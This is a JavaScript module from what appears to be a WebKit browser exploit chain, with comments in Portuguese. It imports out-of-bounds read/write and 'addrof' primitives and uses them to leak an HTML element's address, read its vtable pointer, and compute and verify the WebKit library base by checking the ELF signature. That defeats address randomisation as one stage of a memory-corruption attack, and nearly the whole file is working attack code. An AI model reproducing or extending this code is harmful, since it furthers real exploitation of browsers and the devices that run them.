// js/script3/testArrayBufferVictimCrash.mjs (v113 - Substituído addrof por Heisenbug)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - A primitiva 'addrof' baseada em NaN Boxing foi completamente removida, pois se mostrou
//   ineficaz no ambiente alvo, independentemente da estratégia.
// - O script agora importa e utiliza 'attemptAddrofUsingCoreHeisenbug' de 'core_exploit.mjs',
//   que representa uma abordagem de 'addrof' mais complexa e com maior chance de sucesso.
// - O fluxo foi simplificado para uma única cadeia de exploração, agora que a causa raiz
//   da falha anterior foi identificada.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    isOOBReady,
    arb_read,
    selfTestOOBReadWrite,
    // #MODIFICADO: Importa a nova primitiva addrof
    attemptAddrofUsingCoreHeisenbug
} from '../core_exploit.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v113_Heisenbug";

// #REMOVIDO: Funções de conversão double/int64 não são mais necessárias.

// =======================================================================================
// TESTE DE VAZAMENTO DA BASE DO WEBKIT (Atualizado para usar addrof via Heisenbug)
// =======================================================================================
async function runWebKitBaseLeakTest_Heisenbug(addrof_primitive, arb_read_primitive) {
    const FNAME_LEAK_TEST = "WebKitBaseLeakTest_v113_Heisenbug";
    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit (Estratégia Heisenbug) ---`, "subtest", FNAME_LEAK_TEST);
    try {
        // 1. Alocar um objeto alvo para ter seu endereço vazado.
        const target_obj = document.createElement('div');
        logS3(`[PASSO 1] Alvo para o vazamento: Objeto HTMLDivElement`, "info", FNAME_LEAK_TEST);

        // 2. Usar a primitiva 'addrof' (Heisenbug) para obter o endereço do objeto.
        //    Esta primitiva é assíncrona e retorna um objeto de resultado.
        const addrof_result = await addrof_primitive(target_obj);
        logS3(`[PASSO 2] Resultado da primitiva addrof (Heisenbug): ${JSON.stringify(addrof_result)}`, "info", FNAME_LEAK_TEST);

        if (!addrof_result.success || !addrof_result.leaked_address_as_int64) {
            throw new Error(`A primitiva addrof (Heisenbug) falhou: ${addrof_result.message}`);
        }
        
        const target_addr = new AdvancedInt64(addrof_result.leaked_address_as_int64);
        logS3(`[PASSO 3] Endereço vazado do objeto HTMLDivElement: ${toHex(target_addr)}`, "leak", FNAME_LEAK_TEST);

        // 4. Ler o ponteiro da vtable do endereço vazado.
        logS3(`[PASSO 4] Lendo 8 bytes de ${toHex(target_addr)} para obter o ponteiro da vtable...`, "info", FNAME_LEAK_TEST);
        const vtable_ptr = await arb_read(target_addr, 8); // Usa arb_read diretamente
        logS3(`[PASSO 5] Ponteiro da Vtable vazado (via arb_read): ${toHex(vtable_ptr)}`, "leak", FNAME_LEAK_TEST);
        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
            throw new Error("Ponteiro da vtable vazado é nulo. A leitura pode ter falhado ou o objeto é inválido.");
        }

        // 5. Calcular e verificar a base do WebKit.
        const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not();
        const webkit_base_candidate = vtable_ptr.and(ALIGNMENT_MASK);
        logS3(`[PASSO 6] Candidato a endereço base do WebKit (alinhado): ${toHex(webkit_base_candidate)}`, "leak", FNAME_LEAK_TEST);
        
        const elf_magic_full = await arb_read(webkit_base_candidate, 8);
        const elf_magic_low = elf_magic_full.low();
        logS3(`[PASSO 7] Assinatura lida do endereço base: ${toHex(elf_magic_low)}`, "leak", FNAME_LEAK_TEST);
        
        if (elf_magic_low === 0x464C457F) {
            logS3(`++++++++++++ SUCESSO DE VAZAMENTO! Assinatura ELF encontrada! ++++++++++++`, "vuln", FNAME_LEAK_TEST);
            return { success: true, webkit_base: webkit_base_candidate.toString(true) };
        } else {
            throw new Error(`Assinatura ELF não encontrada. Lido: ${toHex(elf_magic_low)}, Esperado: 0x464C457F.`);
        }

    } catch (e) {
        logS3(`[FALHA] Falha no teste de vazamento do WebKit (Heisenbug): ${e.message}`, "critical", FNAME_LEAK_TEST);
        console.error(e);
        return { success: false, webkit_base: null };
    }
}

// #MODIFICADO: Orquestrador principal agora usa a cadeia de exploração única e mais robusta.
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas do Core (v113) ---`, "test");

    let final_result = { success: false, message: "Teste não iniciado corretamente.", webkit_base: null };

    try {
        // --- FASE 1: INICIALIZAR E VALIDAR PRIMITIVAS DE LEITURA/ESCRITA ---
        logS3("--- FASE 1/2: Validando primitivas de Leitura/Escrita do core_exploit... ---", "subtest");
        // O autoteste também inicializa o ambiente OOB
        const self_test_ok = await selfTestOOBReadWrite(logS3);
        if (!self_test_ok) {
            throw new Error("Autoteste das primitivas de L/E do core_exploit FALHOU. Abortando.");
        }
        logS3("Primitivas 'arb_read' e 'arb_write' estão operacionais.", "vuln");

        // --- FASE 2: EXECUTAR O VAZAMENTO USANDO A PRIMITIVA ADDRFO DO CORE ---
        logS3("--- FASE 2/2: Tentando vazar a base do WebKit com 'addrof' via Heisenbug... ---", "subtest");
        
        // Passa a primitiva 'addrof' importada e a 'arb_read' para a função de teste.
        const leak_result = await runWebKitBaseLeakTest_Heisenbug(attemptAddrofUsingCoreHeisenbug, arb_read);
        
        if (leak_result.success) {
             final_result = {
                success: true,
                message: "Cadeia de exploração concluída com SUCESSO. Base do WebKit VAZADA via Heisenbug!",
                webkit_base: leak_result.webkit_base
            };
        } else {
             final_result = {
                success: false,
                message: "A cadeia de exploração foi executada, mas o vazamento da base do WebKit com a primitiva Heisenbug FALHOU. Verifique os logs.",
                webkit_base: null
            };
        }

    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
